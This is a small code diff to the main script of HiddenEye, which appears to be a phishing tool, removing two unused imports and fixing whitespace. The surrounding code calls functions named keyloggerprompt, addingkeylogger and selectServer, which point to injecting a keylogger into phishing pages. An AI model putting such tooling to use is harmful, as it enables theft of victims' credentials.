@@ -3,8 +3,6 @@
 #HiddenEye by Open Source Community
 #
 import multiprocessing
-import gettext
-import sys
 from Defs.Checks import *
 from Defs.Configurations import *
 from Defs.Actions import *
@@ -27,7 +25,7 @@ if __name__ == "__main__":
 
         keyloggerprompt()
         addingkeylogger()
-       
+
         inputCustom()
         ##############
         selectServer()
